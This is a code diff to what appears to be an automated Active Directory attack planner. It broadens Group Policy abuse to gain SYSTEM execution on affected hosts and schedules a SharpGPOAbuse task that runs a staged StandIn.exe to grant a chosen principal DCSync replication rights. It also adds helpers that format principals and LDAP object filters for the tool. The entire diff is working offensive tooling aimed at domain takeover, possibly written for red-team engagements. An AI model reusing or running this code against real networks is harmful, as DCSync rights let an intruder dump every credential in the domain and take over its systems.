@@ -135,6 +135,7 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
     explicit_replication_domains = set(_replication_right_domains(achieved | facts))
 
     gpo_guids = _gpo_guid_map(facts)
+    gpo_scope = _gpo_scope_map(facts)
     gpo_dc_scope = _gpo_dc_scope_map(facts)
     controlled_gpos = _controlled_gpos_with_domain(facts)
     system_exec_gpos = _system_exec_gpos(achieved)
@@ -157,7 +158,7 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
         ):
             continue
         effect = f"system-exec:gpo:{gpo}@{domain}"
-        if effect in achieved:
+        if effect in achieved or effect in terminal_failed:
             continue
         if _gpo_downstream_effect_proves_progress(domain, achieved):
             continue
@@ -170,7 +171,8 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
                 domain,
                 legacy_note,
                 gpo_guids.get(gpo, ""),
-                gpo_dc_scope.get((gpo, domain), []),
+                affected_hosts=gpo_scope.get((gpo, domain), []),
+                affected_dc_hosts=gpo_dc_scope.get((gpo, domain), []),
             )
         )
 
@@ -2346,7 +2348,9 @@ def _build_gpo_system_exec_execution_plan(
 
     slug = _slug(gpo)
     explicit_proof_path = _input_text(inputs, "proof_path") or _text(intent.get("proof_path"))
+    explicit_proof_unc = _input_text(inputs, "proof_unc") or _text(intent.get("proof_unc"))
     proof_path = explicit_proof_path or f"C:\\Users\\Public\\sage_gpo_{slug}_whoami.txt"
+    proof_read_path = explicit_proof_unc or proof_path
     explicit_command_path = (
         _input_text(inputs, "command_path", "system_command", "command", "executable")
         or _text(intent.get("command_path") or intent.get("system_command") or intent.get("command") or intent.get("executable"))
@@ -2375,6 +2379,13 @@ def _build_gpo_system_exec_execution_plan(
             *_input_list(intent, "affected_dc_hosts", "affected_dcs", "dc_hosts"),
             *_input_list(inputs, "target_dc", "target_dcs", "target_domain_controller", "target_domain_controllers"),
             *_input_list(intent, "target_dc", "target_dcs", "target_domain_controller", "target_domain_controllers"),
+        ]
+    )
+    affected_hosts = _dedupe_texts(
+        [
+            *_input_list(inputs, "affected_hosts", "affected_computer_hosts", "affected_computers", "computer_hosts"),
+            *_input_list(intent, "affected_hosts", "affected_computer_hosts", "affected_computers", "computer_hosts"),
+            *affected_dc_hosts,
         ]
     )
     current_host = _normalize(
@@ -2480,6 +2491,8 @@ def _build_gpo_system_exec_execution_plan(
         redirected_proof_path = _gpo_system_task_redirect_path(command_arguments)
         if redirected_proof_path:
             proof_path = redirected_proof_path
+            if not explicit_proof_unc:
+                proof_read_path = redirected_proof_path
     fallback_requested = method in {
         "fallback",
         "gpp-fallback",
@@ -2510,7 +2523,7 @@ def _build_gpo_system_exec_execution_plan(
                 expected_probe="extract_gpo_system_exec_probe",
             )
         ]
-        if inputs.get("force_refresh", True) is not False and _gpo_local_refresh_applies(current_host, affected_dc_hosts):
+        if inputs.get("force_refresh", True) is not False and _gpo_local_refresh_applies(current_host, affected_hosts):
             steps.append(CapabilityExecutionStep(
                 operation="gpo-refresh-local",
                 parameters={"domain": domain, "gpo": gpo},
@@ -2552,7 +2565,7 @@ def _build_gpo_system_exec_execution_plan(
         else:
             steps.append(CapabilityExecutionStep(
                 operation="gpo-proof-read",
-                parameters={"proof_path": proof_path},
+                parameters={"proof_path": proof_read_path},
                 capability=action.name,
                 purpose="read the marker written by the GPO SYSTEM task; only this proof can record system-exec",
                 expected_probe="extract_gpo_system_exec_probe",
@@ -2634,7 +2647,7 @@ def _build_gpo_system_exec_execution_plan(
     else:
         steps.append(CapabilityExecutionStep(
             operation="gpo-proof-read",
-            parameters={"proof_path": proof_path},
+            parameters={"proof_path": proof_read_path},
             capability=action.name,
             purpose="read the marker written by the GPO SYSTEM task; only this proof can record system-exec",
             expected_probe="extract_gpo_system_exec_probe",
@@ -2759,6 +2772,7 @@ def _build_grant_directory_rights_execution_plan(
             missing=missing,
             reason="grant-directory-rights needs a target domain and controlled principal",
         )
+    principal = _qualified_domain_principal(principal, domain)
 
     rights, unknown = _replication_right_guids(action.intent.get("rights"))
     if unknown:
@@ -2799,26 +2813,43 @@ def _build_grant_directory_rights_execution_plan(
             "C:\\Windows\\Temp\\StandIn.exe"
         gpo_tool = _input_text(inputs, "gpo_tool") or "SharpGPOAbuse.exe"
         prerequisite = f"stage StandIn.exe at {remote_standin_path} on GPO-applied host(s)"
-        for right_name, guid in rights:
-            task_name = _task_name("Grant", domain, right_name)
-            standin_args = _standin_grant_args(target_dn, principal, guid)
+        steps.append(CapabilityExecutionStep(
+            operation="gpo-computer-task",
+            parameters={
+                "tool": gpo_tool,
+                "gpo": gpo,
+                "task_name": _task_name("Grant", domain, "DCSync"),
+                "author": "NT AUTHORITY\\SYSTEM",
+                "command": remote_standin_path,
+                "arguments": _standin_dcsync_grant_args(target_dn, principal),
+                "force": True,
+                "staged_tool": grant_tool,
+                "staged_tool_path": remote_standin_path,
+            },
+            capability=action.name,
+            purpose=f"schedule StandIn to grant DCSync rights through {gpo}",
+            expected_probe="extract_directory_rights_probe",
+            prerequisites=[prerequisite],
+        ))
+        wait_aliases = (
+            "wait_seconds",
+            "gpo_wait_seconds",
+            "gp_refresh_wait_seconds",
+            "dc_refresh_wait_seconds",
+            "delay_seconds",
+        )
+        wait_seconds = _input_int(inputs, *wait_aliases, default=_input_int(action.intent, *wait_aliases, default=300))
+        if wait_seconds > 0:
             steps.append(CapabilityExecutionStep(
-                operation="gpo-computer-task",
+                operation="gpo-wait",
                 parameters={
-                    "tool": gpo_tool,
-                    "gpo": gpo,
-                    "task_name": task_name,
-                    "author": "NT AUTHORITY\\SYSTEM",
-                    "command": remote_standin_path,
-                    "arguments": standin_args,
-                    "force": True,
-                    "staged_tool": grant_tool,
-                    "staged_tool_path": remote_standin_path,
+                    "seconds": wait_seconds,
+                    "reason": f"wait for Group Policy refresh after DCSync grant task write for {gpo}@{domain}",
                 },
                 capability=action.name,
-                purpose=f"schedule StandIn to grant {right_name} through {gpo}",
+                purpose="wait a bounded Group Policy refresh window before polling the directory ACL",
                 expected_probe="extract_directory_rights_probe",
-                prerequisites=[prerequisite],
+                prerequisites=["artifact:gpo_immediate_task"],
             ))
     else:
         return CapabilityExecutionPlan(
@@ -2832,6 +2863,7 @@ def _build_grant_directory_rights_execution_plan(
         parameters={
             "tool": grant_tool,
             "target_dn": target_dn,
+            "principal": principal,
             "ntacl": True,
         },
         capability=action.name,
@@ -4648,14 +4680,23 @@ def _gpo_controlled_system_exec_action(
     domain: str,
     note: str = "",
     gpo_guid: str = "",
+    affected_hosts: list[str] | None = None,
     affected_dc_hosts: list[str] | None = None,
 ) -> CapabilityAction:
     target = f"gpo={gpo};domain={domain}"
     dc_hosts = sorted({_normalize(host) for host in (affected_dc_hosts or []) if _normalize(host)})
+    all_hosts = sorted({
+        _normalize(host)
+        for host in [*(affected_hosts or []), *dc_hosts]
+        if _normalize(host)
+    })
     reason = note or "controlled GPO can deliver a computer-side SYSTEM action; prove execution before chaining"
+    if all_hosts:
+        reason = f"{reason}; BloodHound scope includes host(s): {', '.join(all_hosts)}"
     if dc_hosts:
         reason = f"{reason}; BloodHound scope includes DC host(s): {', '.join(dc_hosts)}"
     source_facts = [f"generic-write:gpo:{gpo}", f"gpo-domain:{gpo}:{domain}"]
+    source_facts.extend(f"gpo-affects-computer:{gpo}:{host}:{domain}" for host in all_hosts)
     source_facts.extend(f"gpo-affects-dc:{gpo}:{host}:{domain}" for host in dc_hosts)
     effects = [f"system-exec:gpo:{gpo}@{domain}"]
     if dc_hosts:
@@ -4674,6 +4715,7 @@ def _gpo_controlled_system_exec_action(
             "gpo": gpo,
             "domain": domain,
             "gpo_guid": gpo_guid,
+            "affected_hosts": all_hosts,
             "affected_dc_hosts": dc_hosts,
             "preferred_effect": "domain-admin-membership" if dc_hosts else "system-exec-proof",
             "steps": [
@@ -5547,6 +5589,25 @@ def _gpo_guid_map(facts: set[str]) -> dict[str, str]:
 def _gpo_dc_scope_map(facts: set[str]) -> dict[tuple[str, str], list[str]]:
     out: dict[tuple[str, str], set[str]] = {}
     prefix = "gpo-affects-dc:"
+    for fact in facts:
+        if not fact.startswith(prefix):
+            continue
+        tail = fact[len(prefix):]
+        parts = tail.split(":")
+        if len(parts) < 3:
+            continue
+        gpo = _normalize(parts[0])
+        host = _normalize(parts[1])
+        domain = _normalize(":".join(parts[2:]))
+        if not gpo or not host or not domain:
+            continue
+        out.setdefault((gpo, domain), set()).add(host)
+    return {key: sorted(value) for key, value in out.items()}
+
+
+def _gpo_scope_map(facts: set[str]) -> dict[tuple[str, str], list[str]]:
+    out: dict[tuple[str, str], set[str]] = {}
+    prefix = "gpo-affects-computer:"
     for fact in facts:
         if not fact.startswith(prefix):
             continue
@@ -6980,9 +7041,8 @@ def _replication_right_probe_from_text(text: str) -> dict[str, bool]:
     low = _text(text).casefold()
     get_changes = (
         "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in low
-        or ("get-changes" in low and "get-changes-all" not in low)
-        or ("get changes" in low and "get changes all" not in low)
-        or "replicating directory changes" in low
+        or re.search(r"\bget[- ]changes\b(?![- ]all)", low) is not None
+        or re.search(r"\breplicating directory changes\b(?! all)", low) is not None
     )
     get_changes_all = (
         "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" in low
@@ -7144,10 +7204,35 @@ def _infer_ticket_key_type(value: str) -> str:
 
 def _standin_grant_args(target_dn: str, principal: str, guid: str) -> str:
     return " ".join([
-        "--object", _quote_cli(target_dn),
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
         "--grant", _quote_cli(principal),
         "--guid", _quote_cli(guid),
     ])
+
+
+def _standin_dcsync_grant_args(target_dn: str, principal: str) -> str:
+    return " ".join([
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
+        "--grant", _quote_cli(principal),
+        "--type", "DCSync",
+    ])
+
+
+def _standin_object_filter(target_dn: str) -> str:
+    text = _text(target_dn).strip()
+    if text.casefold().startswith("distinguishedname="):
+        return text
+    if text.casefold().startswith("dc="):
+        return "distinguishedname=" + text
+    return text
+
+
+def _qualified_domain_principal(principal: str, domain: str) -> str:
+    text = _text(principal).strip()
+    if not text or "\\" in text or "@" in text:
+        return text
+    netbios = _text(domain).strip().split(".", 1)[0].upper()
+    return f"{netbios}\\{text}" if netbios else text
 
 
 def _replication_right_guids(rights: Any) -> tuple[list[tuple[str, str]], list[str]]:
